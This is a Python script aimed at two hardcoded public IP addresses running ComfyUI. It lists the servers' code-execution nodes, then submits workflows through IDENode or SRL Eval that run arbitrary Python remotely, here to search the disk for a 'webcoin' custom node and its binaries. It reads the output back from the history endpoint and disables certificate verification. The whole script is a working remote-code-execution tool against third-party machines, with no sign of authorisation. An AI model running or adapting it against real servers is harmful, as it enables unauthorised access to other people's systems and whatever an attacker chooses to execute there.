"""Check what code execution nodes exist on the 404 machines and if webcoin is on disk."""
import json, sys, io, ssl, time, urllib.request, urllib.error

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

MACHINES = [
    ("43.218.199.5", "http://43.218.199.5:80"),
    ("194.6.247.91", "http://194.6.247.91:8188"),
]


def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        kw = {"timeout": timeout}
        if url.startswith("https"):
            kw["context"] = ctx
        with urllib.request.urlopen(req, **kw) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:200]
    except Exception as e:
        return 0, str(e)[:200]


for ip, base in MACHINES:
    print(f"\n{'='*60}")
    print(f"  {ip} ({base})")
    print(f"{'='*60}")

    code, body = fetch(f"{base}/object_info")
    if code == 200:
        try:
            obj = json.loads(body)
            exec_nodes = [k for k in obj if any(x in k.lower() for x in
                ["ide", "eval", "python", "exec", "srl", "script"])]
            print(f"  Code execution nodes: {exec_nodes if exec_nodes else 'NONE'}")
            webcoin_nodes = [k for k in obj if "webcoin" in k.lower() or "enhanced" in k.lower()]
            print(f"  Webcoin nodes: {webcoin_nodes if webcoin_nodes else 'NONE'}")
        except Exception as e:
            print(f"  object_info parse error: {e}")
    else:
        print(f"  object_info: HTTP {code}")

    CHECK = (
        "import os\\nlines = []\\n"
        "for p in ['/root/ComfyUI/custom_nodes/webcoin','/home/ubuntu/ComfyUI/custom_nodes/webcoin',\\n"
        "  '/opt/ComfyUI/custom_nodes/webcoin','/workspace/ComfyUI/custom_nodes/webcoin',\\n"
        "  '/app/ComfyUI/custom_nodes/webcoin','/mnt/my_disk/ComfyUI/custom_nodes/webcoin',\\n"
        "  '/home/ec2-user/ComfyUI/custom_nodes/webcoin']:\\n"
        "    if os.path.isdir(p):\\n"
        "        lines.append('found=' + p)\\n"
        "        bd = os.path.join(p, 'bin')\\n"
        "        if os.path.isdir(bd):\\n"
        "            lines.append('bin=' + str(os.listdir(bd)))\\n"
        "result = chr(10).join(lines) if lines else 'webcoin=NOT_FOUND'"
    )

    node_setups = [
        {
            "1": {"class_type": "IDENode", "inputs": {"pycode": CHECK.replace("\\n", "\n"), "language": "python"}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        },
        {
            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": CHECK.replace("\\n", "\n")}},
            "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
        },
    ]

    for nodes in node_setups:
        prompt = {"prompt": nodes, "extra_data": {"extra_pnginfo": {
            "workflow": {"nodes": [
                {"id": 1, "type": nodes["1"]["class_type"]},
                {"id": 2, "type": nodes["2"]["class_type"]},
            ]}
        }}}
        body_bytes = json.dumps(prompt).encode()
        try:
            req = urllib.request.Request(
                f"{base}/prompt", data=body_bytes,
                headers={"Content-Type": "application/json"}, method="POST"
            )
            kw = {"timeout": 10}
            if base.startswith("https"):
                kw["context"] = ctx
            with urllib.request.urlopen(req, **kw) as r:
                resp = json.loads(r.read())
            if "error" in resp:
                print(f"  {nodes['1']['class_type']}: rejected: {json.dumps(resp.get('error',''))[:100]}")
                continue
            pid = resp.get("prompt_id")
            print(f"  {nodes['1']['class_type']}: prompt accepted (pid={pid})")

            time.sleep(12)

            try:
                req2 = urllib.request.Request(f"{base}/history/{pid}")
                kw2 = {"timeout": 10}
                if base.startswith("https"):
                    kw2["context"] = ctx
                with urllib.request.urlopen(req2, **kw2) as r2:
                    hist = json.loads(r2.read())
                entry = hist.get(pid, {})
                outputs = entry.get("outputs", {})
                texts = []
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            texts.extend(str(v) for v in val)
                        elif isinstance(val, str):
                            texts.append(val)
                result = "\n".join(texts) if texts else json.dumps(outputs)[:200]
                print(f"  Result: {result[:300]}")
                break
            except Exception as e:
                print(f"  History fetch: {e}")
                break
        except Exception as e:
            print(f"  {nodes['1']['class_type']}: error: {str(e)[:100]}")

print("\nDone.")
